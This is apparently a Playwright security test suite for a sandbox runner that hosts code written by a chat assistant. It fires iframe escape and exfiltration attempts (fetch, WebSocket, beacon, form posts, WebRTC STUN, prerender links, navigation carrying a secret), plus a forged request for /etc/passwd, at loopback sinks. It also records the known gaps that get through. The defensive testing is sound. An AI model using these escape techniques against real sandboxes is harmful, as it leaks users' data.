import { createSocket } from 'node:dgram';
import { createServer, type Server, type Socket } from 'node:net';
import { expect, test, type Page } from '@playwright/test';
import {
  SANDBOX_ALLOW,
  SANDBOX_FLAGS,
  SANDBOX_REFERRER_POLICY,
} from '../../packages/ui/src/lib/sandbox-attrs';

/**
 * Escape attempts against the sandbox runner (ADR 0019, layer 2; AC7, AC8). The code under test is what a
 * compromised or tricked assistant could write; it is given to the real runner, embedded with the same iframe
 * attributes as `SandboxFrame`. It does not go through the API's static check on purpose: that check is a courtesy,
 * the sandbox is the boundary. No login or database is needed: the runner is a static server and the host page
 * comes from `sandbox-host.mjs`.
 */

const RUNNER = process.env.E2E_RUNNER ?? 'http://localhost:3101';
/** A tiny page served by `sandbox-host.mjs`: a real local server, because Chrome blocks a mocked page from framing localhost. */
const HOST_URL = 'http://localhost:3418/';

/** Reports an outcome to the host the only way a block can: an allowlisted bridge message. */
const report = `function report(name, outcome) {
  parent.postMessage({ v: 1, id: 'r-' + name, op: 'ui.error', args: { message: 'RESULT ' + name + ' ' + outcome } }, '*');
}
function attempt(name, fn) {
  try { var value = fn(); report(name, 'ran:' + String(value)); } catch (e) { report(name, 'blocked:' + (e && e.name)); }
}`;

/**
 * What the code's requests came to. `leaks` are requests that really went to the network (the route handler only
 * sees those); `blocked` are requests the browser refused before sending, by CSP. A secure runner has no leaks.
 */
interface Watch {
  leaks: string[];
  blocked: string[];
}

async function open(page: Page, html: string, watch: Watch) {
  await page.context().route('**/leak**', async (route) => {
    watch.leaks.push(route.request().url());
    await route.fulfill({ status: 200, body: 'leaked' });
  });
  page.on('requestfailed', (request) => {
    if (request.url().includes('/leak'))
      watch.blocked.push(`${request.url()} ${request.failure()?.errorText}`);
  });
  await page.goto(HOST_URL);
  await page.evaluate(
    ([attrs, source]) =>
      (window as unknown as { run(a: unknown, h: string): void }).run(attrs, source as string),
    [
      {
        sandbox: SANDBOX_FLAGS,
        allow: SANDBOX_ALLOW,
        referrerPolicy: SANDBOX_REFERRER_POLICY,
        src: `${RUNNER}/runner.html`,
      },
      html,
    ] as const,
  );
}

type Relayed = {
  origin: string;
  data: { op?: string; kind?: string; args?: { message?: string } };
};
const messages = (page: Page) =>
  page.evaluate(() => (window as unknown as { __messages: Relayed[] }).__messages);

/** The host page's own report of its main thread (see `sandbox-host.mjs`), read over HTTP, not through the browser. */
async function hostState(): Promise<{
  at: number;
  now: number;
  count: number;
  maxGap: number;
  ready: boolean;
}> {
  const response = await fetch(`${HOST_URL}state`);
  return (await response.json()) as Awaited<ReturnType<typeof hostState>>;
}

async function results(page: Page, names: string[]): Promise<Record<string, string>> {
  await expect
    .poll(
      async () => {
        const seen = (await messages(page)).map((m) => m.data.args?.message ?? '');
        return names.every((name) => seen.some((text) => text.startsWith(`RESULT ${name} `)));
      },
      { timeout: 10_000 },
    )
    .toBe(true);
  const out: Record<string, string> = {};
  for (const m of await messages(page)) {
    const text = m.data.args?.message ?? '';
    const match = /^RESULT (\S+) (.*)$/.exec(text);
    if (match) out[match[1]!] = match[2]!;
  }
  return out;
}

/** A TCP port on loopback that counts connections: a preconnect, a prefetch or a navigation shows up here. */
async function tcpSink() {
  let connections = 0;
  const requests: string[] = [];
  const sockets = new Set<Socket>();
  const server: Server = createServer((socket) => {
    connections += 1;
    sockets.add(socket);
    socket.on('data', (chunk) => {
      requests.push(String(chunk).split('\r\n')[0] ?? '');
      socket.end('HTTP/1.1 200 OK\r\nContent-Length: 0\r\n\r\n');
    });
    socket.on('error', () => undefined);
  });
  await new Promise<void>((resolve) => server.listen(0, '127.0.0.1', resolve));
  const port = (server.address() as { port: number }).port;
  return {
    port,
    url: `http://127.0.0.1:${port}/leak`,
    connections: () => connections,
    requests: () => requests,
    close: () =>
      new Promise<void>((resolve) => {
        sockets.forEach((socket) => socket.destroy());
        server.close(() => resolve());
      }),
  };
}

/** A UDP port on loopback that counts datagrams: what a STUN request from WebRTC looks like. */
async function udpSink() {
  let packets = 0;
  const socket = createSocket('udp4');
  socket.on('message', () => (packets += 1));
  await new Promise<void>((resolve) => socket.bind(0, '127.0.0.1', resolve));
  return {
    port: socket.address().port,
    packets: () => packets,
    close: () => new Promise<void>((resolve) => socket.close(() => resolve())),
  };
}

/** Starts a WebRTC connection that asks a STUN server to answer; the page can run this wherever it has the class. */
const rtcProbe = (port: number, globalExpr: string) => `function () {
  var pc = new ${globalExpr}({ iceServers: [{ urls: 'stun:127.0.0.1:${port}' }] });
  pc.createDataChannel('x');
  pc.createOffer().then(function (o) { return pc.setLocalDescription(o); }).catch(function () {});
  return 'constructed';
}`;

test.describe('sandbox runner', () => {
  test('serves the strict headers', async ({ request }) => {
    const res = await request.get(`${RUNNER}/runner.html`);
    expect(res.status()).toBe(200);
    const csp = res.headers()['content-security-policy'] ?? '';
    for (const directive of [
      "default-src 'none'",
      "connect-src 'none'",
      "form-action 'none'",
      "base-uri 'none'",
      "frame-src 'none'",
      "child-src 'none'",
    ])
      expect(csp).toContain(directive);
    expect(res.headers()['cross-origin-opener-policy']).toBe('same-origin');
    expect(res.headers()['x-content-type-options']).toBe('nosniff');
    expect(res.headers()['x-dns-prefetch-control']).toBe('off');
    expect(res.headers()['set-cookie']).toBeUndefined();
  });

  test('runs a harmless page, reports ready and a size, and tags messages with the opaque origin', async ({
    page,
  }) => {
    const watch: Watch = { leaks: [], blocked: [] };
    await open(
      page,
      `<button id="b">Nghe</button><script>
         window.cuelingo.resize(120).catch(function(){});
       </script>`,
      watch,
    );
    await expect
      .poll(async () => (await messages(page)).some((m) => m.data.op === 'ui.ready'))
      .toBe(true);
    const all = await messages(page);
    // A frame without allow-same-origin reports the string "null", never the runner's own origin.
    expect(all.every((m) => m.origin === 'null')).toBe(true);
    expect(all.some((m) => m.data.op === 'ui.resize')).toBe(true);
    expect(watch.leaks).toEqual([]);
  });

  test('cannot reach the parent, the top page, cookies or storage (AC7)', async ({ page }) => {
    const watch: Watch = { leaks: [], blocked: [] };
    await open(
      page,
      `<script>${report}
         attempt('parent-document', function () { return parent.document.title; });
         attempt('top-document', function () { return top.document.title; });
         attempt('top-location-read', function () { return top.location.href; });
         attempt('cookie', function () { return document.cookie; });
         attempt('local-storage', function () { return localStorage.getItem('x'); });
         attempt('session-storage', function () { return sessionStorage.length; });
         attempt('indexed-db', function () { return indexedDB.open('x') && 'opened'; });
       </script>`,
      watch,
    );
    const out = await results(page, [
      'parent-document',
      'top-document',
      'top-location-read',
      'cookie',
      'local-storage',
      'session-storage',
    ]);
    for (const name of [
      'parent-document',
      'top-document',
      'top-location-read',
      'cookie',
      'local-storage',
      'session-storage',
    ])
      expect(out[name], name).toMatch(/^blocked:/);
    expect(watch.leaks).toEqual([]);
  });

  test('cannot open a connection of any kind (AC7)', async ({ page }) => {
    const watch: Watch = { leaks: [], blocked: [] };
    const target = 'http://127.0.0.1:9/leak';
    await open(
      page,
      `<script>${report}
         var violations = 0;
         document.addEventListener('securitypolicyviolation', function () { violations += 1; });
         attempt('websocket', function () { new WebSocket('ws://127.0.0.1:9/leak'); return 'constructed'; });
         attempt('event-source', function () { new EventSource('${target}'); return 'constructed'; });
         attempt('xhr', function () { var x = new XMLHttpRequest(); x.open('GET', '${target}'); x.send(); return 'sent'; });
         attempt('beacon', function () { return navigator.sendBeacon('${target}', 'x'); });
         attempt('image', function () { new Image().src = '${target}.png'; return 'requested'; });
         attempt('worker', function () { new Worker('${target}.js'); return 'started'; });
         fetch('${target}').then(
           function () { report('fetch', 'ran:resolved'); },
           function (e) { report('fetch', 'blocked:' + (e && e.name)); }
         );
         setTimeout(function () { report('violations', String(violations)); }, 800);
       </script>`,
      watch,
    );
    const out = await results(page, ['fetch', 'violations', 'beacon', 'image']);
    expect(out.fetch).toMatch(/^blocked:/);
    expect(Number(out.violations)).toBeGreaterThan(0);
    // The decisive check: whatever the code did, nothing was ever requested from the leak address.
    await page.waitForTimeout(500);
    expect(watch.leaks).toEqual([]);
    // Chrome refused the attempts itself, by policy, before anything was sent.
    expect(watch.blocked.length).toBeGreaterThan(0);
    expect(watch.blocked.every((entry) => /csp/i.test(entry))).toBe(true);
  });

  test('cannot navigate, open windows or submit forms (AC7)', async ({ page, context }) => {
    const watch: Watch = { leaks: [], blocked: [] };
    const popups: string[] = [];
    context.on('page', (popup) => popups.push(popup.url()));
    await open(
      page,
      `<form id="f" action="http://127.0.0.1:9/leak" method="post"><input name="a" value="secret"></form>
       <script>${report}
         attempt('window-open', function () { return window.open('http://127.0.0.1:9/leak') === null ? 'null' : 'window'; });
         attempt('top-navigate', function () { top.location = 'http://127.0.0.1:9/leak'; return 'assigned'; });
         attempt('parent-navigate', function () { parent.location = 'http://127.0.0.1:9/leak'; return 'assigned'; });
         attempt('form-submit', function () { document.getElementById('f').submit(); return 'submitted'; });
         attempt('self-navigate', function () { location.href = 'http://127.0.0.1:9/leak'; return 'assigned'; });
         attempt('meta-refresh', function () {
           var m = document.createElement('meta'); m.httpEquiv = 'refresh'; m.content = '0;url=http://127.0.0.1:9/leak';
           document.head.appendChild(m); return 'added';
         });
       </script>`,
      watch,
    );
    const out = await results(page, [
      'window-open',
      'top-navigate',
      'parent-navigate',
      'form-submit',
    ]);
    expect(out['window-open']).toBe('ran:null');
    expect(out['top-navigate']).toMatch(/^blocked:/);
    expect(out['parent-navigate']).toMatch(/^blocked:/);
    await page.waitForTimeout(1000);
    expect(watch.leaks).toEqual([]);
    expect(popups).toEqual([]);
    // The host page is where it was, and the block did not turn into another page.
    expect(page.url()).toBe(HOST_URL);
    await expect(page.locator('#alive')).toHaveText('host page');
    const urls = page.frames().map((f) => f.url());
    expect(urls.some((u) => u.includes('127.0.0.1:9'))).toBe(false);
  });

  test('drops forged, unknown and oversized messages before the host sees them (AC9)', async ({
    page,
  }) => {
    const watch: Watch = { leaks: [], blocked: [] };
    await open(
      page,
      `<script>
         var send = function (m) { parent.postMessage(m, '*'); };
         send({ v: 1, id: 'a', op: 'fs.read', args: { path: '/etc/passwd' } });
         send({ v: 1, id: 'b', op: '__proto__', args: {} });
         send({ v: 2, id: 'c', op: 'ui.ready' });
         send({ v: 1, id: 'big', op: 'tts.speak', args: { text: new Array(100001).join('a') } });
         send({ v: 1, id: 'cyc', op: 'ui.ready', args: (function () { var o = {}; o.o = o; return o; })() });
         send({ v: 1, id: 'ok', op: 'ui.resize', args: { height: 150 } });
       </script>`,
      watch,
    );
    await expect
      .poll(async () => (await messages(page)).some((m) => m.data.op === 'ui.resize'))
      .toBe(true);
    await page.waitForTimeout(500);
    const ops = (await messages(page)).map((m) => `${m.data.op}`);
    expect(ops).not.toContain('fs.read');
    expect(ops).not.toContain('__proto__');
    expect(ops).not.toContain('tts.speak');
    expect((await messages(page)).some((m) => (m.data as { id?: string }).id === 'big')).toBe(
      false,
    );
  });

  test('a page stuck in a loop does not freeze the chat page (AC8)', async ({ page }) => {
    const watch: Watch = { leaks: [], blocked: [] };
    const startedAt = Date.now();
    await open(page, `<script>while (true) {}</script>`, watch);
    // Let the runner load and hand over the page, then watch the host's own main thread for a few seconds.
    // While the frame spins, any round trip into the browser can take very long on a small CI runner (it timed out
    // at 90 s there), so nothing here asks the browser: the host page reports its own heartbeat to its server and
    // the test reads it from there. A page that froze could not report, and would show one long gap between ticks.
    await new Promise((resolve) => setTimeout(resolve, 5000));
    const state = await hostState();
    // The host did report after the block started, and was still reporting at the end of the wait.
    expect(state.at).toBeGreaterThan(startedAt);
    expect(state.now - state.at).toBeLessThan(1000);
    expect(state.maxGap).toBeLessThan(1000);
    // The block never said it was ready, which is what makes the host's watchdog remove it after 3 seconds.
    expect(state.ready).toBe(false);
  });

  test('cannot reach the network through WebRTC (STUN), directly or from a fresh realm', async ({
    page,
  }) => {
    const udp = await udpSink();
    try {
      // Control: the same code on the plain host page does send, so the sink and the probe work.
      await page.goto(HOST_URL);
      await page.evaluate(`(${rtcProbe(udp.port, 'RTCPeerConnection')})()`);
      await expect.poll(() => udp.packets(), { timeout: 8000 }).toBeGreaterThan(0);
      const afterControl = udp.packets();

      const watch: Watch = { leaks: [], blocked: [] };
      await open(
        page,
        `<body><script>${report}
           attempt('rtc', ${rtcProbe(udp.port, 'RTCPeerConnection')});
           attempt('rtc-webkit', ${rtcProbe(udp.port, 'webkitRTCPeerConnection')});
           attempt('rtc-overwrite', function () { window.RTCPeerConnection = function () {}; return 'assigned'; });
           attempt('rtc-redefine', function () { Object.defineProperty(window, 'RTCPeerConnection', { value: 1 }); return 'redefined'; });
           attempt('rtc-fresh-realm', function () {
             var f = document.createElement('iframe');
             document.body.appendChild(f);
             if (!f.contentWindow) return 'no-frame';
             var w = f.contentWindow;
             var pc = new w.RTCPeerConnection({ iceServers: [{ urls: 'stun:127.0.0.1:${udp.port}' }] });
             pc.createDataChannel('x');
             pc.createOffer().then(function (o) { return pc.setLocalDescription(o); }).catch(function () {});
             return 'constructed';
           });
         </script>`,
        watch,
      );
      const out = await results(page, [
        'rtc',
        'rtc-webkit',
        'rtc-overwrite',
        'rtc-redefine',
        'rtc-fresh-realm',
      ]);
      expect(out.rtc).toMatch(/^blocked:/);
      expect(out['rtc-webkit']).toMatch(/^blocked:/);
      expect(out['rtc-redefine']).toMatch(/^blocked:/);
      // The decisive check, as for the network: no STUN packet left, whichever way the code tried.
      await page.waitForTimeout(4000);
      expect(udp.packets()).toBe(afterControl);
    } finally {
      await udp.close();
    }
  });

  test('cannot warm up connections: link hints are refused, removed or (prerender) a known gap', async ({
    page,
  }) => {
    const sink = await tcpSink();
    try {
      // Control: a prefetch link on the plain host page does reach the sink, so the sink and the probe work.
      // Chrome driven by automation never acts on preconnect or dns-prefetch hints (checked with its net log, with
      // and without the automation switches that turn background networking off), so those two cannot be
      // observed here: they are covered by the header, the meta policy and the static check instead.
      await page.goto(HOST_URL);
      await page.evaluate((url) => {
        const link = document.createElement('link');
        link.rel = 'prefetch';
        link.href = `${url}-control`;
        document.head.appendChild(link);
      }, sink.url);
      await expect.poll(() => sink.connections(), { timeout: 8000 }).toBeGreaterThan(0);
      const afterControl = sink.connections();

      const watch: Watch = { leaks: [], blocked: [] };
      const origin = new URL(sink.url).origin;
      // 1. A page with a link element in its markup is refused by the runner, before anything is drawn. A prerender
      //    link is the one hint Chrome fetches despite the policy (it reached the sink before this check existed).
      await open(
        page,
        `<link rel="preconnect" href="${origin}"><link rel="dns-prefetch" href="${origin}">
         <link rel="prefetch" href="${sink.url}1"><link rel="prerender" href="${sink.url}2">
         <link rel="modulepreload" href="${sink.url}3.js"><link rel="preload" as="image" href="${sink.url}4.png">
         <template><link rel="prerender" href="${sink.url}5"></template><p>hi</p>`,
        watch,
      );
      await expect
        .poll(async () =>
          (await messages(page)).some((m) => m.data.args?.message === 'blocked: link element'),
        )
        .toBe(true);
      expect(page.frames().some((f) => f.url() === 'about:srcdoc')).toBe(false);
      await page.waitForTimeout(2000);
      expect(sink.requests().filter((r) => !r.includes('-control'))).toEqual([]);
      expect(sink.connections()).toBe(afterControl);

      // 2. Links made by script are removed the moment they are added, and reported.
      await page.goto(HOST_URL);
      await open(
        page,
        `<body><script>${report}
           ['preconnect', 'dns-prefetch', 'prefetch', 'prerender', 'modulepreload'].forEach(function (rel, i) {
             attempt('link-' + rel, function () {
               var l = document.createElement('link'); l.rel = rel; l.href = '${sink.url}d' + i;
               document.head.appendChild(l); return 'added';
             });
           });
           attempt('link-written', function () { document.write('<link rel=prerender href="${sink.url}w">'); return 'written'; });
           setTimeout(function () { report('done', 'yes'); }, 1500);
         </script>`,
        watch,
      );
      await results(page, ['link-preconnect', 'link-prerender']);
      await page.waitForTimeout(3000);
      // KNOWN GAP (ADR 0019): a prerender link added by script makes Chrome send one GET to its URL before the
      // observer can remove it, whatever the CSP says (`prefetch-src` included). Nothing else may get through.
      const leaked = sink.requests().filter((r) => !r.includes('-control'));
      expect(leaked.filter((r) => !r.includes('/leakd3'))).toEqual([]);
      test.info().annotations.push({
        type: 'residual',
        description: `dynamic <link rel=prerender> reached the target: ${leaked.length > 0}`,
      });
      expect(watch.leaks).toEqual([]);
    } finally {
      await sink.close();
    }
  });

  // Navigating its own frame cannot be stopped from inside the page (the Navigation API does not fire for a
  // cross-origin target, checked in Chrome), and Chrome opens a TCP connection to the target before the frame-src
  // policy refuses it, so the host name is resolved. These tests pin what IS guaranteed: no HTTP request (path,
  // query, body) is ever sent, the target document never loads, and the host page is untouched. The residual
  // connection is annotated, and is why `phrases.list` needs the person's consent (ADR 0019).
  const selfNavigation: Record<string, (url: string) => string> = {
    'location.href': (url) => `<script>location.href = '${url}';</script>`,
    'location.replace': (url) => `<script>location.replace('${url}');</script>`,
    'static meta refresh': (url) => `<meta http-equiv="refresh" content="0;url=${url}">`,
    'injected meta refresh': (url) =>
      `<script>document.head.insertAdjacentHTML('beforeend', '<meta http-equiv=refresh content="0;url=${url}">');</script>`,
    'clicked link': (url) =>
      `<body><a id="a" href="${url}">x</a><script>document.getElementById('a').click();</script>`,
  };
  for (const [vector, make] of Object.entries(selfNavigation)) {
    test(`self-navigation by ${vector} sends no request and never loads the target`, async ({
      page,
    }, testInfo) => {
      const sink = await tcpSink();
      try {
        const watch: Watch = { leaks: [], blocked: [] };
        await open(page, make(`${sink.url}?secret=phrase`), watch);
        await page.waitForTimeout(3500);
        expect(sink.requests(), 'no HTTP request line ever reached the target').toEqual([]);
        expect(watch.leaks).toEqual([]);
        const urls = page.frames().map((f) => f.url());
        expect(urls.some((u) => u.includes(String(sink.port)))).toBe(false);
        // The runner (a frame of the host) is still there and the host page is where it was.
        expect(urls).toContain(`${RUNNER}/runner.html`);
        expect(page.url()).toBe(HOST_URL);
        await expect(page.locator('#alive')).toHaveText('host page');
        testInfo.annotations.push({
          type: 'residual',
          description: `${sink.connections()} TCP connection(s) opened to the target before the policy refused it`,
        });
      } finally {
        await sink.close();
      }
    });
  }

  test('cannot create a frame of its own to request a URL or to get a fresh realm', async ({
    page,
  }) => {
    const sink = await tcpSink();
    try {
      const watch: Watch = { leaks: [], blocked: [] };
      await open(
        page,
        `<body><script>${report}
           function frame(name, src) {
             attempt(name, function () {
               var f = document.createElement('iframe');
               if (src) f.src = src;
               document.body.appendChild(f);
               return f.contentWindow ? 'has-window' : 'no-window';
             });
           }
           frame('frame-sink', '${sink.url}');
           frame('frame-runner-path', '/runner.html?secret=1');
           frame('frame-blank');
           attempt('frame-srcdoc', function () {
             var f = document.createElement('iframe'); f.srcdoc = '<p>x</p>';
             document.body.appendChild(f); return 'added';
           });
           setTimeout(function () { report('done', 'yes'); }, 1500);
         </script>`,
        watch,
      );
      const out = await results(page, ['frame-sink', 'frame-runner-path', 'frame-blank', 'done']);
      await page.waitForTimeout(1500);
      expect(sink.requests()).toEqual([]);
      expect(page.frames().some((f) => f.url().includes('secret=1'))).toBe(false);
      expect(page.frames().some((f) => f.url().includes(String(sink.port)))).toBe(false);
      test.info().annotations.push({
        type: 'frame-blank',
        description: `about:blank frame by script: ${out['frame-blank']}; connections: ${sink.connections()}`,
      });
    } finally {
      await sink.close();
    }
  });
});
